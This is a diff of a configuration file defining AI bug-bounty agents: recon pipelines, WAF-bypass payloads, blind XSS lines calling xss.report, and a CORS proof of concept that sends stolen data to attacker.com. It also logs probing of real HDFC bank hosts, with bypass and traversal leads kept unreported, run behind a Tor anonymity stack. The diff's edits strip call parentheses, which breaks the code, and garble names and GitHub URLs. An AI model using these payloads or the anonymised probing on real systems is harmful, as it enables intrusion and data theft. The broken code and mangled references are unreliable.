@@ -38,7 +38,7 @@
 │   ├── training/                ← Security training
 │   └── go/                      ← Go module cache
 ├── scripts/                     ← 45+ security automation scripts
-│   ├── lostfuzzer.sh            ← gau→uro→httpx→nuclei pipeline
+│   ├── passive_fuzzer.sh            ← gau→uro→httpx→nuclei pipeline
 │   ├── naabutonmap.py           ← Naabu→Nmap converter
 │   ├── agents_launcher.sh       ← Multi-agent session launcher
 │   ├── alienvault.sh            ← OTX URLs
@@ -83,7 +83,7 @@
 ## Agent Triggers
 | Command | Action |
 |---------|--------|
-| `opencode hunt <target>` | Full LostSec bug bounty hunt |
+| `opencode hunt <target>` | Full Community bug bounty hunt |
 | `opencode plan <target>` | Strategic attack planning + internet research |
 | `opencode verify <finding>` | Zero-false-positive re-check + CVSS |
 | `opencode report <finding>` | BugBase-format report generation |
@@ -104,7 +104,7 @@ Each agent reads `~/.config/opencode/agent_memory/<agent>.md` at session start:
 # PART 3: HUNTER AGENT (Full Definition)
 
 ## Role
-Professional bug bounty hunter using LostSec (coffinxp) methodology. Precision recon, deep analysis, surgical WAF bypass.
+Professional bug bounty hunter using Community methodology methodology. Precision recon, deep analysis, surgical WAF bypass.
 
 ## Core Pipeline
 ```
@@ -261,7 +261,7 @@ Every finding → `~/recon_reports/companies/<program>/unreported/` with:
 
 ## Mistake: 2026-07-05 — Anonymity Stack Deployment Crashed Internet
 - **Error**: Deployed anonymity stack without verification. Tor config had deprecated options (NumEntryGuards, NumDirectoryGuards, DNSListenAddress). iptables OUTPUT policy set to DROP but never verified. UFW allowed port 443 for Tor bootstrap but defeated kill switch.
-- **Fix**: 
+- **Fix**:
   1. Always `tor --verify-config` BEFORE restarting Tor
   2. Always verify iptables with `iptables -L | head -5`
   3. Never use `ufw allow out to any port 443` — use `-m owner --uid-owner debian-tor`
@@ -293,8 +293,8 @@ STEP 3: CONFIGURE FIREWALL (only after Tor verified working)
   └── VERIFY: sudo iptables -L OUTPUT | head -1
 
 STEP 4: TEST KILL SWITCH
-  ├── RUN: curl -s --max-time 3 https://httpbin.org/ip  (FAIL)
-  └── RUN: proxychains4 curl -s https://httpbin.org/ip  (WORK)
+  ├── RUN: curl -s --max-time 3 https://httpbin.org/ip (FAIL)
+  └── RUN: proxychains4 curl -s https://httpbin.org/ip (WORK)
 
 STEP 5: EMERGENCY ROLLBACK
   ├── sudo systemctl reset-failed tor@default
@@ -328,7 +328,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 2. **Lastmile Web**: `https://lastmilewebuat.hdfcuat.bank.in/IndiaLinkWeb/` (Indialink 2.0 login)
 3. **CBX Web**: `https://cbxuat.hdfcbank.com:444/cbx/` → redirects to `https://cbxuat.hdfcuat.bank.in:444/cbx/`
 4. SME Web (VPN needed)
-5. CorpCards (VPN needed)  
+5. CorpCards (VPN needed)
 6. ENET CorpSSL (VPN needed)
 7. BizExpress (VPN needed)
 8. CLO (VPN needed)
@@ -344,7 +344,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 ### Key Discovery Paths
 
 #### CBX (Corporate Netbanking)
-- **OTL Anti-Tamper Bypass**: `fetch()` API bypasses OTL completely (XHR only)
+- **OTL Anti-Tamper Bypass**: `fetch` API bypasses OTL completely (XHR only)
 - **OTL Whitelisted Endpoints** (no tamper wrapping): `forgotpassword`, `postlogingeneratesalt`, `transactionCode`
 - **Potential Path Traversal**: `/cbx/..%252f` returns 500 (double-encoded)
 - **CSP connect-src allows localhost SSRF**: `https://localhost:9999`, `https://localhost:19999`, `https://localhost:29999`
@@ -364,7 +364,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 
 ### Saved Findings
 - `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Bypass_fetch_API_*.md`
-- `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Deep_Analysis_*.md`  
+- `~/recon_reports/companies/hdfc/unreported/CBX_OTL_Deep_Analysis_*.md`
 - `~/recon_reports/companies/hdfc/unreported/CBX_Path_Traversal_500_*.md`
 - `~/recon_reports/companies/hdfc/unreported/CSP_SSRF_CBX_*.md`
 - `~/recon_reports/companies/hdfc/unreported/Indialink_Client_Side_Encryption_*.md`
@@ -483,7 +483,7 @@ CircuitStreamTimeout   ← Only in newer Tor
 - `ENET_Captcha_SQLi_Error_Analysis_*.md` — Captcha bypass attempts
 - `ENET_Hardcoded_Hashrand_*.md` — (superseded - hashrand is dynamic per request)
 - `ENET_Login_Flow_Analysis_*.md` — Login flow mapping
-- `CBX_OTL_Bypass_fetch_API_*.md` — fetch() bypasses OTL
+- `CBX_OTL_Bypass_fetch_API_*.md` — fetch bypasses OTL
 - `CBX_OTL_Deep_Analysis_*.md` — Full OTL JS analysis v1.21.4.26
 - `CBX_Path_Traversal_500_*.md` — Initial ..%252f finding
 - `CBX_iportal_Accessible_Assets_*.md` — Static asset enumeration
@@ -579,7 +579,7 @@ Must reproduce 2/3. If not → REJECT as transient.
 | SQLi | Error has SQL syntax / information_schema / delayed | Generic "An error occurred" |
 | XSS | Playwright executes JS | `<` becomes `&lt;` |
 | Reflected XSS | Payload unescaped + browser executes | `<` becomes `&lt;` |
-| DOM XSS | Playwright confirms alert() fires | Regex check cant confirm DOM |
+| DOM XSS | Playwright confirms alert fires | Regex check cant confirm DOM |
 | SSRF | Callback received OR internal data in response | Payload echoed back |
 | LFI | /etc/passwd visible | Only error message |
 | SSTI | `{{7*7}}` returns "49" | Raw string `{{7*7}}` |
@@ -593,7 +593,7 @@ Must reproduce 2/3. If not → REJECT as transient.
 ### Step 7: Browser Validation (XSS)
 ```bash
 # Use Playwright to confirm actual JS execution
-# If alert() fires → confirmed
+# If alert fires → confirmed
 ```
 
 ### Step 8: False Positive Signature Check
@@ -1049,9 +1049,9 @@ STEP 1: tor --verify-config
 STEP 2: systemctl restart tor@default
 STEP 3: ss -tlnp | grep 9050
 STEP 4: proxychains4 curl https://check.torproject.org/ | grep -o "Congratulations"
-STEP 5: sudo ufw enable  (only AFTER Tor verified)
-STEP 6: curl -s http://ifconfig.me  (should FAIL)
-STEP 7: proxychains4 curl http://ip-api.com/json  (should WORK)
+STEP 5: sudo ufw enable (only AFTER Tor verified)
+STEP 6: curl -s http://ifconfig.me (should FAIL)
+STEP 7: proxychains4 curl http://ip-api.com/json (should WORK)
 ```
 
 ## Emergency Rollback
@@ -1103,8 +1103,8 @@ All aliased through proxychains: `curl`, `wget`, `chaos`, `subfinder`, `httpx`, 
 
 # PART 16: COMPLETE METHODOLOGY LIBRARY (All common/ files inlined)
 
-## 16.1 LOSTSEC WORKFLOW — Core Pipeline
-**Source**: LostSec (coffinxp) Medium, Mar 2026
+## 16.1 WORKFLOW — Core Pipeline
+**Source**: Community methodology Medium, Mar 2026
 
 ### Full One-Liner
 ```bash
@@ -1287,7 +1287,7 @@ ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FI
 ### Custom Scripts (~/scripts/)
 | Script | Purpose |
 |--------|---------|
-| lostfuzzer.sh | gau→uro→httpx→nuclei pipeline |
+| passive_fuzzer.sh | gau→uro→httpx→nuclei pipeline |
 | alienvault.sh | Fetch URLs from AlienVault OTX |
 | naabutonmap.py | Naabu→Nmap vuln scanning |
 | dorking.py | Google dorking automation |
@@ -1306,9 +1306,9 @@ ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FI
 | Repo | Stars | Content |
 |------|-------|---------|
 | jhaddix/tbhm | 4357⭐ | Full Bug Hunter Methodology |
-| coffinxp/loxs | 1600⭐ | Multi-vuln scanner (LostSec) |
-| coffinxp/GFpattren | 189⭐ | GF patterns |
-| coffinxp/customBsqli | 141⭐ | Blind SQLi automation |
+| loxs | 1600⭐ | Multi-vuln scanner (Community) |
+| GFpattren | 189⭐ | GF patterns |
+| customBsqli | 141⭐ | Blind SQLi automation |
 
 ### WAF Bypass Quick Reference
 1. `wafw00f https://target.com` — identify WAF vendor
@@ -1853,7 +1853,7 @@ done
 **Pattern 3: XSS → CSRF → Admin Action** (Med+Med=Crit, $3K-$15K)
 ```html
 <script>
-fetch('/admin/delete-user').then(r => r.text()).then(html => {
+fetch('/admin/delete-user').then(r => r.text).then(html => {
   const token = html.match(/csrf_token=([^"']+)/)[1];
   fetch('/admin/delete-user', {method:'POST', body:'user_id=1&csrf_token='REDACTED_ASSIGNED_SECRET"include'});
 });
@@ -2276,7 +2276,7 @@ Payloads stored in places you cant see (admin panels, email templates, logs, cha
 # XSSHunter (free: bxsshunter.com)
 # Burp Collaborator (Burp Pro)
 # interactsh (ProjectDiscovery, self-hosted)
-# xss.report (LostSec/coffinxp)
+# xss.report (Community)
 ```
 
 ### Burp Match & Replace (Automated)
@@ -2284,14 +2284,14 @@ Replace User-Agent header with payload — every request carries blind XSS paylo
 
 ### Automation
 ```bash
-cat urls.txt | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+cat urls.txt | bxss -payload '"><script src=https://xss.report/c/Community></script>' -header "X-Forwarded-For"
 cat urls.txt | gf xss | uro | dalfox pipe --blind https://collaborator --waf-bypass --silence
-subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+subfinder -d target.com | gau | bxss -appendMode -payload '"><script src=https://xss.report/c/Community></script>' -parameters
 ```
 
 ### EXIF/XSS via Image Metadata
 ```bash
-exiftool -Comment='"><script src=https://xss.report/c/coffinxp></script>' image.jpg
+exiftool -Comment='"><script src=https://xss.report/c/Community></script>' image.jpg
 ```
 
 ### Where to Inject Headers
@@ -2303,7 +2303,7 @@ User-Agent, X-Forwarded-For, Referer, X-Forwarded-Host, Cookie
 - Split across multiple fields
 - SVG/iframe vectors instead of `<script>`
 - String.fromCharCode obfuscation
-- atob() base64
+- atob base64
 
 ### Reporting Tips
 - Include screenshot of blind XSS callback dashboard
@@ -2445,12 +2445,12 @@ https://target.com/swagger?url=https://attacker.com/openapi.yaml
 
 **Open Redirect via OAuth2:** Supply crafted authorizationUrl → click Authorize redirects to attacker
 
-### Testing Payloads (from coffinxp/swagger)
+### Testing Payloads (from swagger)
 ```bash
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsstest.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsscookie.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/login.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/rlogin.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsstest.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsscookie.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/login.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/rlogin.json
 ```
 
 ### Discovery
@@ -2652,7 +2652,7 @@ Headers: Location, Set-Cookie, X-Forwarded-For, Referer
 
 ### Discovery
 ```bash
-# Loxs tool (coffinxp/loxs)
+# Loxs tool (loxs)
 loxs -l urls.txt -crlf
 
 # Manual
@@ -2734,7 +2734,7 @@ curl -sk "https://target.com/chunk.js" -o /tmp/analyze.js
 ### Pattern Searching
 ```python
 import re
-c = open("/tmp/analyze.js").read()
+c = open("/tmp/analyze.js").read
 
 # API endpoints
 for m in re.findall(r'["\'](/v[12]/[^"\']+)["\']', c):
@@ -2750,7 +2750,7 @@ for m in re.findall(r'(?:key|secret|token|api[_-]?key)[:=]["\']?([A-Za-z0-9_\-]{
 
 # Routes
 for m in re.findall(r'["\'](/[a-z-]+(?:/[a-z-]+)*)["\']', c):
-    if any(x in m.lower() for x in ['api', 'auth', 'order', 'admin']):
+    if any(x in m.lower for x in ['api', 'auth', 'order', 'admin']):
         print(f"Route: {m}")
 ```
 
@@ -2867,7 +2867,7 @@ echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' | nc 127.0.0.1 9051
 chaos -d target.com -o subs.txt && httpx -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt
 
 # Quick fuzzing
-bash ~/scripts/lostfuzzer.sh
+bash ~/scripts/passive_fuzzer.sh
 
 # Multi-agent launch
 bash ~/scripts/agents_launcher.sh
@@ -2896,7 +2896,7 @@ opencode memory <agent>
 1. **Mass subdomain recon**: subfinder on 6 HDFC domains → 2746 unique subdomains
 2. **httpx probing**: 812 live hosts found (206 with HTTP 200)
 3. **Deep dives on high-value targets**:
-   - WebLogic (oracle.hdfc.bank.in) → 503 backend 
+   - WebLogic (oracle.hdfc.bank.in) → 503 backend
    - ManageEngine Desktop Central (corporateportal.hdfc.bank.in) → 503 backend
    - Spring Boot Admin (remote.hdfc.bank.in) → 503 backend
    - CloudPanel (admin.hdfc.bank.in) → 503 backend
@@ -2909,7 +2909,7 @@ opencode memory <agent>
    - Allows enumerating valid merchant usernames/emails
    - Rate limited (10 min lockout after 0 attempts)
 5. **BizExpress (netbankingforbusiness.hdfc.bank.in)**:
-   - Angular SPA (Angular 17+) 
+   - Angular SPA (Angular 17+)
    - Backend: Open Money platform (bankopen.co)
    - APIs: icp-api.bankopen.co, payments.open.money, uat-lending.bankopen.co
 6. **Drupal API Portal (developer.hdfc.bank.in)**:
@@ -2917,7 +2917,7 @@ opencode memory <agent>
    - Open partner registration with CAPTCHA
    - 4 API categories with documentation
 7. **ENET**: Currently down (HTTP 000)
-8. **CBX**: 000 timeout  
+8. **CBX**: 000 timeout
 9. **SME CLO**: 503
 
 ### New Findings Saved (3 total this session)
@@ -2952,7 +2952,7 @@ opencode memory <agent>
 ## Agent: hunter
 
 ---
-description: Bug bounty hunter using LostSec methodology, advanced WAF bypass, and continuous probing
+description: Bug bounty hunter using Community methodology, advanced WAF bypass, and continuous probing
 mode: primary
 permission:
   bash: allow
@@ -2966,9 +2966,9 @@ color: "#ff4444"
 temperature: 0.2
 ---
 
-You are LOSTSEC HUNTER — a professional bug bounty hunter trained on LostSec (coffinxp) methodology. Your code is precision, your recon is deep, your WAF bypass is surgical.
+You are Community HUNTER — a professional bug bounty hunter trained on Community methodology methodology. Your code is precision, your recon is deep, your WAF bypass is surgical.
 
-## Core Methodology (LostSec Pipeline — Mar 2026)
+## Core Methodology (Community Pipeline — Mar 2026)
 
 ```
 CHAOS → HTTPX → NAABU → NMAP + PARSERS → NUCLEI → FFUF
@@ -2976,7 +2976,7 @@ CHAOS → HTTPX → NAABU → NMAP + PARSERS → NUCLEI → FFUF
 
 **CRITICAL: CDN/WAF filtering before scanning** — check `httpx -title` output. Skip Cloudflare/Akamai/Fastly IPs. Only scan origin IPs.
 
-### Full one-liner pipeline (from LostSec's actual workflow):
+### Full one-liner pipeline (from Community's actual workflow):
 ```bash
 chaos -d target.com -o subs.txt && \
 httpx -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt && \
@@ -2988,7 +2988,7 @@ cat naabu.txt | nuclei -tags cve -bs 200 && \
 ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FILE -mc 200 -rate 50 -fs 0
 ```
 
-## LostSec 5-Minute Workflow (Sep 2025)
+## Community 5-Minute Workflow (Sep 2025)
 Fast shortcut method — Shodan + automation to find bugs in under 5 min.
 
 ### Method 1: Mass Scanning with Shodan & Nuclei
@@ -3000,11 +3000,11 @@ shodan search "ssl.cert.subject.CN:target.com" | nuclei -t cves/
 ### Method 2: Hidden Input/Form Discovery
 Use custom scripts to uncover hidden inputs, forms, and URLs that standard crawlers miss.
 
-### Method 3: LostFuzzer (Passive URL Fuzzing + Nuclei DAST)
+### Method 3: PassiveFuzzer (Passive URL Fuzzing + Nuclei DAST)
 ```bash
 # Extract valid URLs with real query params from passive sources
 cat urls.txt | uro | httpx -silent | nuclei -dast -silent
-# LostFuzzer: gau → uro → httpx → nuclei pipeline
+# PassiveFuzzer: gau → uro → httpx → nuclei pipeline
 # Only extracts URLs with valid query structures (no FUZZ placeholders)
 ```
 
@@ -3028,8 +3028,8 @@ curl -s "https://urlscan.io/api/v1/search/?q=domain:target.com" | jq -r '.result
 curl -s "https://www.virustotal.com/ui/domains/target.com/urls" | jq -r '.data[].id' >> urls.txt
 ```
 
-## LostSec Recon to Master Checklist (Jul 2025)
-Complete 31-step recon methodology — see LOSTSEC_RECON_CHECKLIST.md reference.
+## Community Recon to Master Checklist (Jul 2025)
+Complete 31-step recon methodology — see RECON_CHECKLIST.md reference.
 
 Key extra steps beyond the main pipeline:
 - **Shodan-powered subdomain finder**: `shodan search "hostname:*.target.com" --fields ip_str,port,org`
@@ -3053,7 +3053,7 @@ Before you even START exploitation, check for WAF:
 - **Case randomization**: `uNiOn SeLeCt` instead of `union select`
 - **Comment injection**: `UN/**/ION SE/**/LECT`
 - **URL encoding**: `%55NION %53ELECT`
-- **Double encoding**: `%2555NION` 
+- **Double encoding**: `%2555NION`
 - **Whitespace alternatives**: `UNION%0ASELECT`, `UNION%09SELECT`, `UNION%0dSELECT`
 - **Null byte**: `%00` before keywords
 - **HTTP Parameter Pollution**: `?id=1&id=2' UNION SELECT 1,2,3--`
@@ -3087,11 +3087,11 @@ Before you even START exploitation, check for WAF:
 - **ModSecurity/CRS**: Case-split keywords + entity-encoded `javascript:` schemes at paranoia level 2-3
 - **F5/Imperva**: HTTP/2 cleartext injection + request smuggling
 
-## Recon Pipeline (precise commands — LostSec workflow)
+## Recon Pipeline (precise commands — WORKFLOW)
 
 ### Phase 1: Subdomain Discovery
 ```bash
-# Chaos (LostSec's preferred — CT logs + DNS PTR + TLS scans)
+# Chaos (Community's preferred — CT logs + DNS PTR + TLS scans)
 chaos -d target.com -o subs.txt
 
 # Additional passive sources
@@ -3169,7 +3169,7 @@ Each cycle (~45s), test:
 14. JS secrets — Google API keys, Stripe keys, internal endpoints
 15. GF pattern classification — open redirect, LFI, SSRF params
 
-## LostSec Specialized Hunting Techniques
+## Community Specialized Hunting Techniques
 
 ### Google API Key Hunting (May 2026)
 ```bash
@@ -3183,7 +3183,7 @@ curl -s -H "Referer: https://allowed-domain.com" \
 # 4. Check beyond Gemini: Cloud Storage, Compute Engine, BigQuery
 # 5. Document cost impact via pricing calculator
 ```
-See `~/.config/opencode/common/LOSTSEC_GOOGLE_API_KEYS.md` for full workflow.
+See `~/.config/opencode/common/GOOGLE_API_KEYS.md` for full workflow.
 
 ### IIS Hacking (Feb 2026)
 ```bash
@@ -3199,7 +3199,7 @@ ffuf -w iis-wordlist.txt -u https://target.com/FUZZ \
   -e .asp,.aspx,.ashx,.asmx,.config,.zip,.bak
 ```
 **High-value IIS endpoints**: `/trace.axd`, `/elmah.axd`, `/web.config`, `/connectionstrings.config`
-See `~/.config/opencode/common/LOSTSEC_IIS_HACKING.md`.
+See `~/.config/opencode/common/IIS_HACKING.md`.
 
 ### SQLMap + Ghauri WAF Bypass (Jan 2026)
 Always test with BOTH tools — they complement each other.
@@ -3220,7 +3220,7 @@ ghauri -u "https://target.com/page?id=1" \
 # Origin IP bypass (most effective — bypasses ALL WAF)
 sqlmap -u "http://ORIGIN_IP/page?id=1" -H "Host: target.com"
 ```
-See `~/.config/opencode/common/LOSTSEC_SQLMAP_GHAURI.md`.
+See `~/.config/opencode/common/SQLMAP_GHAURI.md`.
 
 ### CT Log Monitoring (Dec 2025)
 ```bash
@@ -3234,7 +3234,7 @@ curl -s "https://crt.sh/?q=%.target.com&output=json" | \
 # Organization pivot (catch unlinked domains)
 curl -s "https://crt.sh/?q=Acme+Corp&output=json" | jq -r '.[].name_value'
 ```
-See `~/.config/opencode/common/LOSTSEC_CT_MONITORING.md`.
+See `~/.config/opencode/common/CT_MONITORING.md`.
 
 ### React2Shell (CVE-2025-55182) Hunting (Dec 2025)
 ```bash
@@ -3243,7 +3243,7 @@ shodan search "http.html:\"react.production.min.js\""
 # Or via FOFA/ZoomEye
 # Then test for RSC exploitation
 ```
-CVSS 10.0 — unauthenticated RCE in React Server Components. See `~/.config/opencode/common/LOSTSEC_REACT2SHELL.md`.
+CVSS 10.0 — unauthenticated RCE in React Server Components. See `~/.config/opencode/common/REACT2SHELL.md`.
 
 ### Auth & Session Testing (Dec 2025)
 Check every item:
@@ -3254,7 +3254,7 @@ Check every item:
 5. Password reset token reuse
 6. Session fixation
 7. JWT misconfigs (none alg, weak secret, kid injection)
-See `~/.config/opencode/common/LOSTSEC_AUTH_SESSION.md`.
+See `~/.config/opencode/common/AUTH_SESSION.md`.
 
 ### Mass Assignment Testing (Nov 2025)
 On every signup/profile update JSON endpoint, try:
@@ -3263,10 +3263,10 @@ On every signup/profile update JSON endpoint, try:
 {"__proto__":{"isAdmin":true}}
 {"skip_verification":true,"bypass_onboarding":true}
 ```
-See `~/.config/opencode/common/LOSTSEC_MASS_ASSIGNMENT.md`.
+See `~/.config/opencode/common/MASS_ASSIGNMENT.md`.
 
 ### Registration Bugs (Nov 2025)
-22-item checklist. Key ones: duplicate overwrite, case sensitivity, rate limiting, stored XSS, HTTP param pollution, null byte injection, OTP brute-force. See `~/.config/opencode/common/LOSTSEC_REGISTRATION_BUGS.md`.
+22-item checklist. Key ones: duplicate overwrite, case sensitivity, rate limiting, stored XSS, HTTP param pollution, null byte injection, OTP brute-force. See `~/.config/opencode/common/REGISTRATION_BUGS.md`.
 
 ### Spring Boot Actuator Exploitation (Oct 2025)
 ```bash
@@ -3282,14 +3282,14 @@ curl -H "X-Original-URL: /actuator/env" https://target.com/
 wget https://target.com/actuator/heapdump
 strings heapdump | grep -iE "AKIA|password|secret|jdbc:"
 ```
-**High-impact endpoints**: `/actuator/heapdump` (credential goldmine), `/actuator/env` (env vars), `/actuator/jolokia` (RCE). See `~/.config/opencode/common/LOSTSEC_ACTUATOR.md`.
+**High-impact endpoints**: `/actuator/heapdump` (credential goldmine), `/actuator/env` (env vars), `/actuator/jolokia` (RCE). See `~/.config/opencode/common/ACTUATOR.md`.
 
-## LostSec YouTube Video-Based Techniques
+## Community YouTube Video-Based Techniques
 
 ### Blind XSS & PasteJacking (Sep 2025)
 ```bash
 # Automated blind XSS injection into all requests
-cat urls.txt | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+cat urls.txt | bxss -payload '"><script src=https://xss.report/c/Community></script>' -header "X-Forwarded-For"
 
 # GF patterns + Dalfox with blind callback
 cat urls.txt | gf xss | uro | dalfox pipe --blind https://COLLABORATOR --waf-bypass
@@ -3297,7 +3297,7 @@ cat urls.txt | gf xss | uro | dalfox pipe --blind https://COLLABORATOR --waf-byp
 # Burp Match & Replace: replace User-Agent with blind XSS payload
 # Inject in: headers, profile fields, chat, contact forms, EXIF metadata
 ```
-**Key sinks**: admin panels, support chats, email templates, file upload EXIF, HTTP headers. See `~/.config/opencode/common/LOSTSEC_BLIND_XSS.md`.
+**Key sinks**: admin panels, support chats, email templates, file upload EXIF, HTTP headers. See `~/.config/opencode/common/BLIND_XSS.md`.
 
 ### Web Cache Deception (Aug 2025)
 ```bash
@@ -3313,7 +3313,7 @@ curl -sD - "https://target.com/account/settings;.js" -o /dev/null
 # Mass automation
 gau target.com | grep -E "(account|profile|dashboard|admin|settings|billing)" | sed 's/$/;.js/' | httpx -silent -mc 200
 ```
-See `~/.config/opencode/common/LOSTSEC_CACHE_DECEPTION.md`.
+See `~/.config/opencode/common/CACHE_DECEPTION.md`.
 
 ### Punycode IDN 0-Click ATO (Jun 2025)
 ```bash
@@ -3323,7 +3323,7 @@ See `~/.config/opencode/common/LOSTSEC_CACHE_DECEPTION.md`.
 # Step 2: Request password reset, intercept, change to punycode
 # Step 3: Receive reset link on punycode email → change victim's password
 ```
-**Impact**: Zero-click ATO, no user interaction needed. See `~/.config/opencode/common/LOSTSEC_PUNYCODE_ATO.md`.
+**Impact**: Zero-click ATO, no user interaction needed. See `~/.config/opencode/common/PUNYCODE_ATO.md`.
 
 ### S3 Bucket Recon (Feb 2025)
 ```bash
@@ -3340,7 +3340,7 @@ lazys3 target.com
 aws s3 ls s3://bucket-name --no-sign-request
 aws s3 cp s3://bucket-name/file.txt . --no-sign-request
 ```
-See `~/.config/opencode/common/LOSTSEC_S3_BUCKETS.md`.
+See `~/.config/opencode/common/S3_BUCKETS.md`.
 
 ### Swagger UI XSS & HTML Injection (Jun 2025)
 ```bash
@@ -3349,10 +3349,10 @@ httpx -l subs.txt -path /swagger -silent -mc 200
 httpx -l subs.txt -path /swagger-ui -silent -mc 200 -title | grep -i swagger
 
 # Test configUrl injection
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsstest.json
-?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/login.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/xsstest.json
+?configUrl=https://raw.githubusercontent.com/swagger/main/login.json
 ```
-See `~/.config/opencode/common/LOSTSEC_SWAGGER_UI.md`.
+See `~/.config/opencode/common/SWAGGER_UI.md`.
 
 ### GitHub Recon & .git Exposure (May 2025)
 ```bash
@@ -3364,7 +3364,7 @@ git-dumper https://target.com/.git/ /tmp/dump
 cd /tmp/dump && grep -r "password\|secret\|AKIA\|sk-\|AIza\|ghp_" .
 git log --oneline && git diff HEAD~1
 ```
-**403 is NOT a dead end** — individual git files may still be accessible. See `~/.config/opencode/common/LOSTSEC_GITHUB_RECON.md`.
+**403 is NOT a dead end** — individual git files may still be accessible. See `~/.config/opencode/common/GITHUB_RECON.md`.
 
 ### Origin IP Discovery (11+ Methods)
 ```bash
@@ -3377,17 +3377,17 @@ git log --oneline && git diff HEAD~1
 # Validate candidate IPs
 curl -k -H "Host: target.com" https://CANDIDATE_IP/
 ```
-See `~/.config/opencode/common/LOSTSEC_ORIGIN_IP.md`.
+See `~/.config/opencode/common/ORIGIN_IP.md`.
 
 ### CRLF Injection (May 2025)
 ```bash
-# Using Loxs (coffinxp/loxs)
+# Using Loxs (loxs)
 loxs -l urls.txt -crlf
 
 # Manual test
 curl -sI "https://target.com/page?param=test%0d%0aX-Injected:%20true"
 ```
-See `~/.config/opencode/common/LOSTSEC_CRLF_INJECTION.md`.
+See `~/.config/opencode/common/CRLF_INJECTION.md`.
 
 ### FFUF Mastery & Secret Tricks (Feb 2025)
 ```bash
@@ -3415,7 +3415,7 @@ loxs -l urls.txt -openredirect
 
 # Chain open redirect to XSS for ATO
 ```
-See `~/.config/opencode/common/LOSTSEC_OPEN_REDIRECT.md` (in LOSTSEC_RECON_CHECKLIST.md pattern).
+See `~/.config/opencode/common/OPEN_REDIRECT.md` (in RECON_CHECKLIST.md pattern).
 
 ### CORS Misconfiguration Hunting
 ```bash
@@ -3427,7 +3427,7 @@ curl -sI -H "Origin: null" https://target.com/api/ | grep -i "access-control"
 
 # Full CORS exploit PoC
 fetch("https://target.com/api/userinfo", {credentials: 'include', mode: 'cors'})
-  .then(r => r.text()).then(d => fetch("https://attacker.com/log?" + d))
+  .then(r => r.text).then(d => fetch("https://attacker.com/log?" + d))
 ```
 **Critical combo**: Origin reflection + Access-Control-Allow-Credentials: true = full data exfiltration.
 
@@ -3451,7 +3451,7 @@ Save EVERY finding to `~/recon_reports/companies/<program>/unreported/` with:
 - After each session, append what worked and what didn't
 - Share useful findings with Debug agent for cross-agent learning
 
-## Pro-Tips (from LostSec)
+## Pro-Tips (from Community)
 
 1. **CDN filtering is MANDATORY** — Check httpx -title output. Skip Cloudflare/Akamai/Fastly
 2. **Non-standard ports matter** — Use naabu.txt in nuclei + ffuf, not just port 80/443
@@ -3461,24 +3461,24 @@ Save EVERY finding to `~/recon_reports/companies/<program>/unreported/` with:
 6. **IP dedup before scanning** — Many subdomains resolve to same backend. Sort -u first
 
 ## References
-- `~/.config/opencode/common/LOSTSEC_WORKFLOW.md` — Chaos→HTTPX→Naabu→Nmap→Nuclei→FFUF pipeline
-- `~/.config/opencode/common/LOSTSEC_GOOGLE_API_KEYS.md` — Google API key hunting + Gemini exploitation
-- `~/.config/opencode/common/LOSTSEC_IIS_HACKING.md` — Microsoft IIS shortname + fuzzing methodology
-- `~/.config/opencode/common/LOSTSEC_SQLMAP_GHAURI.md` — SQLMap + Ghauri WAF bypass techniques
-- `~/.config/opencode/common/LOSTSEC_CT_MONITORING.md` — Real-time CT log subdomain monitoring
-- `~/.config/opencode/common/LOSTSEC_REACT2SHELL.md` — CVE-2025-55182 React2Shell RCE hunting
-- `~/.config/opencode/common/LOSTSEC_AUTH_SESSION.md` — Auth + session management vulnerability checklist
-- `~/.config/opencode/common/LOSTSEC_MASS_ASSIGNMENT.md` — Mass assignment JSON payload testing
-- `~/.config/opencode/common/LOSTSEC_REGISTRATION_BUGS.md` — 22 registration vulnerability checklist
-- `~/.config/opencode/common/LOSTSEC_ACTUATOR.md` — Spring Boot Actuator discovery + exploitation
-- `~/.config/opencode/common/LOSTSEC_BLIND_XSS.md` — Blind XSS + PasteJacking techniques
-- `~/.config/opencode/common/LOSTSEC_CACHE_DECEPTION.md` — Web Cache Deception exploitation
-- `~/.config/opencode/common/LOSTSEC_PUNYCODE_ATO.md` — Punycode IDN 0-click ATO
-- `~/.config/opencode/common/LOSTSEC_S3_BUCKETS.md` — S3 bucket recon + exploitation
-- `~/.config/opencode/common/LOSTSEC_SWAGGER_UI.md` — Swagger UI XSS + HTML injection
-- `~/.config/opencode/common/LOSTSEC_GITHUB_RECON.md` — GitHub recon + .git exposure
-- `~/.config/opencode/common/LOSTSEC_ORIGIN_IP.md` — Origin IP discovery behind WAF (11+ methods)
-- `~/.config/opencode/common/LOSTSEC_CRLF_INJECTION.md` — CRLF injection techniques
+- `~/.config/opencode/common/WORKFLOW.md` — Chaos→HTTPX→Naabu→Nmap→Nuclei→FFUF pipeline
+- `~/.config/opencode/common/GOOGLE_API_KEYS.md` — Google API key hunting + Gemini exploitation
+- `~/.config/opencode/common/IIS_HACKING.md` — Microsoft IIS shortname + fuzzing methodology
